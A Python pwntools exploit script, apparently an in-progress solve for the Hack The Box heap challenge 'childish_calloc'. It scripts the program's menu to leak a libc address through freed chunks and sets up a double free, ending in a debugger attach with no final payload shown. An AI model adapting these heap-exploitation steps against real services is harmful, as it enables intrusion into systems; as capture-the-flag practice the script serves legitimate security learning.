from pwn import *
import sys

context.arch = "amd64"
remote_ip,port = 'docker.hackthebox.eu',31603
binary = ['./childish_calloc']

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)

if(len(sys.argv) > 1):
    io=remote(remote_ip,port)
    context.noptrace  = True
else:
    io=process(binary)

def add(idx,size,data):
    sla("Select Choice: ","1")
    sla("Choose an index: ",str(idx))
    sla("you need for it: ",str(size))
    sla("toy's details: \n",data)

def rm_add(idx,size,data,val=2,skip=0):
    sla("Select Choice: ","2")
    sla("Choose an index: ",str(idx))
    sla("this repair: ",str(size))
    if(skip==0):
        sla("toy's details: \n",data)
        sla("Select choice: ",str(val))

def view(idx):
    sla("Select Choice: ","3")
    sla("Choose an index: ",str(idx))

def big(size):
    sla("Select Choice: ","4")
    sla(" massive toy: ",str(size))

if __name__ == "__main__":
    add(0,32,"a"*20)
    add(1,32,"aaaa")
    rm_add(0,500,"bbbb",skip=1)
    rm_add(1,500,"bbbb",skip=1)
    big(3000)
    add(2,32,"bbbbbbbbbbbb")
    rm_add(0,500,"bbbb",skip=1)
    view(0)
    libc = u64(io.recvline().strip()+"\x00\x00")
    log.info("libc @ "+str(hex(libc)))
    add(3,32,"aaaa")
    add(4,32,"aaaa")
    rm_add(3,500,"bbbb",skip=1)
    rm_add(4,500,"bbbb",skip=1)
    rm_add(3,500,"bbbb",skip=1)
    gdb.attach(io)
    io.interactive()
